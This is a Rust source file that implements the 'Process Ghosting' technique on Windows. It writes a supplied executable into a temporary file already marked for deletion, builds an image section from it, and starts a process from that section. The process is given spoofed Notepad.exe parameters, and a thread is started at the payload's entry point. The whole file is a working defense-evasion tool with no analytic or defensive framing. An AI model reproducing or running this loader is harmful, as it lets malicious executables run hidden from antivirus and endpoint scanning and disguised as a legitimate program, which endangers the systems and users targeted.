use std::{mem::size_of, ptr::null_mut, env::args, fs::read};
use widestring::U16CString;
use ntapi::{
    ntioapi::*, 
    ntmmapi::{NtAllocateVirtualMemory, NtCreateSection, NtReadVirtualMemory, NtWriteVirtualMemory}, 
    ntobapi::NtClose, 
    ntpebteb::PEB, 
    ntpsapi::*, 
    ntrtl::*,
};
use winapi::{
    ctypes::c_void,
    shared::ntdef::{InitializeObjectAttributes, HANDLE, NT_SUCCESS, OBJECT_ATTRIBUTES, OBJ_CASE_INSENSITIVE, UNICODE_STRING},
    um::{fileapi::GetTempFileNameW, processthreadsapi::GetProcessId, userenv::CreateEnvironmentBlock, winnt::*},
};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = args().collect();

    if args.len() != 3 {
        panic!("Usage: Process_Ghosting.exe <exe> <args>");
    }

    let buffer = read(&args[1]).map_err(|e| format!("[!] Erro Read File: {e}"))?;
    let dir_temp = U16CString::from_str(std::env::temp_dir().to_str().unwrap())?;
    let prefix = U16CString::from_str("TT")?;
    let mut temp_file_name: Vec<u16> = vec![0; 256];

    unsafe { GetTempFileNameW(dir_temp.as_ptr(), prefix.as_ptr(), 0, temp_file_name.as_mut_ptr()) };

    let file = String::from_utf16(&temp_file_name).unwrap();
    let path_nt = format!(r"\??\{}", file.trim_matches('\0'));
    println!("[+] PATH TEMP: {}", path_nt);

    let h_section = create_section_file(path_nt, &buffer)?;
    create_process(h_section, buffer, &args[2])?;
    
    Ok(())
}

///
/// Creating a section for the temporary file
/// 
fn create_section_file(path: String, buffer: &[u8]) -> Result<HANDLE, String> {
    let mut file_info = FILE_DISPOSITION_INFORMATION { DeleteFileA: true.into() };
    let mut unicode_string : UNICODE_STRING = unsafe { std::mem::zeroed() };
    let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    let path_name = U16CString::from_str(path).unwrap();

    unsafe { RtlInitUnicodeString(&mut unicode_string, path_name.as_ptr()) };
    unsafe { InitializeObjectAttributes(&mut object_attributes, &mut unicode_string, OBJ_CASE_INSENSITIVE, null_mut(), null_mut()) };

    let mut io_status_block: IO_STATUS_BLOCK = unsafe { std::mem::zeroed() };
    let mut h_file = null_mut();
    let mut h_section = null_mut();

    let mut status = unsafe {
        NtOpenFile(
            &mut h_file,
            GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
            &mut object_attributes,
            &mut io_status_block,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT,
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtOpenFile Failed With Status: {:?}", status));
    }

    status = unsafe {
        NtSetInformationFile(
            h_file,
            &mut io_status_block,
            &mut file_info as *mut _ as *mut c_void,
            size_of::<FILE_DISPOSITION_INFORMATION>() as u32,
            FileDispositionInformation,
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtSetInformationFile Failed With Status: {:?}", status));
    }

    let mut byte_offset: LARGE_INTEGER = unsafe { std::mem::zeroed() };
    status = unsafe {
        NtWriteFile(
            h_file,
            null_mut(),
            None,
            null_mut(),
            &mut io_status_block,
            buffer.as_ptr() as _,
            buffer.len() as u32,
            &mut byte_offset,
            null_mut(),
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtWriteFile Failed With Status: {:?}", status));
    }

    status = unsafe {
        NtCreateSection(
            &mut h_section,
            SECTION_ALL_ACCESS,
            null_mut(),
            null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            h_file,
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtCreateSection Failed With Status: {:?}", status));
    }

    unsafe { NtClose(h_file) };

    Ok(h_section)
}

///
/// Creating a process from the section obtained
/// 
fn create_process(h_section: HANDLE, buffer: Vec<u8>, args: &String) -> Result<(), String> {
    let mut h_process = null_mut();
    let mut status = unsafe {
        NtCreateProcessEx(
            &mut h_process,
            PROCESS_ALL_ACCESS,
            null_mut(),
            NtCurrentProcess,
            PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
            h_section,
            null_mut(),
            null_mut(),
            0,
        )
    };

    unsafe { println!("[+] Process Ghosting PID: {}", GetProcessId(h_process)) };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtCreateProcessEx Failed With Status: {status}"));
    }
    
    let base_address = init_params(h_process, args)?;
    let address_entrypoint = search_entrypoint(&buffer)?;
    let entry_point = ((base_address as usize) + address_entrypoint) as *mut c_void;
    let mut h_thread = null_mut();

    status = unsafe {
        NtCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            null_mut(),
            h_process,
            entry_point,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtCreateThreadEx Failed With Status: {status}"));
    }

    Ok(())
}

///
/// Updating RTL_USER_PROCESS_PARAMETERS to start the process correctly
/// 
fn init_params(h_process: HANDLE, args: &String) -> Result<*mut c_void, String> {
    let command_line = U16CString::from_str(format!("C:\\Windows\\System32\\Notepad.exe {args}")).unwrap();
    let current_directory = U16CString::from_str("C:\\Windows\\System32").unwrap();
    let image_path = U16CString::from_str("C:\\Windows\\System32\\Notepad.exe").unwrap();
    
    let mut user_proc_params: PRTL_USER_PROCESS_PARAMETERS = unsafe { std::mem::zeroed() };
    let mut process_basic_information: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    let mut peb: PEB = unsafe { std::mem::zeroed() };
    
    let mut enviroment = null_mut();
    unsafe { CreateEnvironmentBlock(&mut enviroment, null_mut(), 1) };

    let mut u_command_line: UNICODE_STRING = unsafe { std::mem::zeroed() };
    let mut u_current_directory: UNICODE_STRING = unsafe { std::mem::zeroed() };
    let mut u_image_path: UNICODE_STRING = unsafe { std::mem::zeroed() };

    unsafe { 
        RtlInitUnicodeString(&mut u_command_line, command_line.as_ptr());
        RtlInitUnicodeString(&mut u_current_directory, current_directory.as_ptr()); 
        RtlInitUnicodeString(&mut u_image_path, image_path.as_ptr());
    };

    let mut status = unsafe {
        RtlCreateProcessParametersEx(
            &mut user_proc_params,
            &mut u_image_path,
            null_mut(),
            &mut u_current_directory,
            &mut u_command_line,
            enviroment,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] RtlCreateProcessParametersEx Failed With Status: {status}"));
    }

    status = unsafe { 
        NtQueryInformationProcess(
            h_process, 
            ProcessBasicInformation, 
            &mut process_basic_information as *mut _  as *mut c_void, 
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            null_mut()
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtQueryInformationProcess Failed With Status: {status}"));
    }

    status = unsafe {
        NtReadVirtualMemory(
            h_process, 
            process_basic_information.PebBaseAddress as *mut c_void, 
            &mut peb as *mut _ as *mut c_void, 
            std::mem::size_of::<PEB>(), 
            null_mut()
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtReadVirtualMemory Failed With Status: {status}"));
    }

    println!("[+] Address PEB: {:?}", process_basic_information.PebBaseAddress);

    let mut user_proc_base = user_proc_params as usize;
    let mut user_proc_end = unsafe { (user_proc_params as usize) + (*user_proc_params).Length as usize };
    unsafe { 
        if !(*user_proc_params).Environment.is_null() {
            if user_proc_params as usize > (*user_proc_params).Environment as usize {
                user_proc_base = (*user_proc_params).Environment as usize;
            }

            if ((*user_proc_params).Environment as usize) + (*user_proc_params).EnvironmentSize > user_proc_end {
                user_proc_end = ((*user_proc_params).Environment as usize) + (*user_proc_params).EnvironmentSize;
            }
        }
    }

    let mut size_param = user_proc_end - user_proc_base;
    let mut base_address = user_proc_params as *mut c_void;

    status = unsafe {
        NtAllocateVirtualMemory(
            h_process, 
            &mut base_address,
            0, 
            &mut size_param, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtAllocateVirtualMemory Failed With Status: {status}"));
    }

    let mut number_of_write  = 0;
    status = unsafe {
        NtWriteVirtualMemory(
            h_process, 
            user_proc_params as *mut c_void, 
            user_proc_params as *mut c_void, 
            (*user_proc_params).Length as usize, 
            &mut number_of_write
        )
    };

    if !NT_SUCCESS(status) {
        return Err(format!("[!] NtWriteVirtualMemory Failed With Status: {status}"));
    }

    unsafe { 
        if !(*user_proc_params).Environment.is_null() {
            status = NtWriteVirtualMemory(
                h_process, 
                (*user_proc_params).Environment, 
                (*user_proc_params).Environment, 
                (*user_proc_params).EnvironmentSize, 
                &mut number_of_write
            );

            if !NT_SUCCESS(status) {
                return Err(format!("[!] NtWriteVirtualMemory [2] Failed With Status: {status}"));
            }
        }

        let peb_base_address: *mut PEB = process_basic_information.PebBaseAddress;
        let remote_process_parameters_address = &mut (*peb_base_address).ProcessParameters as *mut *mut RTL_USER_PROCESS_PARAMETERS as *mut c_void;

        status = NtWriteVirtualMemory(
            h_process, 
            remote_process_parameters_address, 
            &user_proc_params as *const _ as *mut c_void, 
            std::mem::size_of::<*mut c_void>(), 
            &mut number_of_write
        );
        
        if !NT_SUCCESS(status) {
            return Err(format!("[!] NtWriteVirtualMemory [3] Failed With Status: {status}"));
        }
    }

    Ok(peb.ImageBaseAddress)
}

///
/// Fetching the RVA AddressOfEntryPoint to start a thread from the address
/// 
fn search_entrypoint(buffer: &[u8]) -> Result<usize, String> {
    unsafe {
        let dos_header = buffer.as_ptr() as *mut IMAGE_DOS_HEADER;
        let nt_header = (dos_header as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            return Err("IMAGE NT SIGNATURE INVALID".to_string());
        }

        Ok((*nt_header).OptionalHeader.AddressOfEntryPoint as usize)
    }
}